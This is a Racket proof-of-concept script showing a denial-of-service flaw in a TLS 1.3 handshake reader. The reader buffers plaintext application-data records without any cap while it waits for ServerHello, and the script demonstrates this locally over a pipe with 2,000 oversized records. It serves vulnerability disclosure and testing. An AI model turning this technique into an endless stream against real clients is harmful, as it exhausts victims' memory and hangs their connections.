#lang racket/base
;; PoC tls-proto P4: the handshake reader buffers UNBOUNDED pre-key data with no
;; cap. During the client's wait for ServerHello (no key installed yet), every
;; plaintext application_data (type 23) record is appended to `hsr-app` and the
;; loop continues (rktcrypto-tls13.rkt hsr-fill, line 196-197). A malicious
;; server / on-path peer that streams type-23 records makes the victim buffer
;; them all before any handshake message is seen: memory grows without limit
;; (and, with an endless stream, hsr-fill never returns -> hang).
;;
;; Finite, safe demonstration: feed N 16000-byte plaintext type-23 records, then
;; one real handshake message, and measure how much `hsr-app` retained.
(require openssl/private/rktcrypto-tls13)

(define N 2000)                      ; 2000 * ~16000 = ~32 MB buffered, no cap
(define payload (make-bytes 16000 65))
(define-values (pin pout) (make-pipe))
(define r (make-rl pin pout))
(define hs (make-hsr r))

;; writer: N plaintext app-data records, then a tiny handshake message (type 22)
(thread
 (lambda ()
   (for ([i (in-range N)])
     (write-bytes (bytes 23 3 3 (arithmetic-shift (bytes-length payload) -8)
                         (bitwise-and (bytes-length payload) 255)) pout)
     (write-bytes payload pout))
   ;; a 4-byte handshake message: type=0 len=0 (just to let hsr-next return)
   (write-bytes (bytes 22 3 3 0 4  0 0 0 0) pout)
   (flush-output pout)
   (close-output-port pout)))

(define before (current-memory-use))
(define-values (mt msg) (hsr-next hs))
(printf "hsr-next returned handshake type=~a after buffering ~a bytes of attacker app-data in hsr-app\n"
        mt (bytes-length (hsr-app hs)))
(printf "approx memory growth during the wait: ~a MB (no cap enforced)\n"
        (quotient (- (current-memory-use) before) (* 1024 1024)))
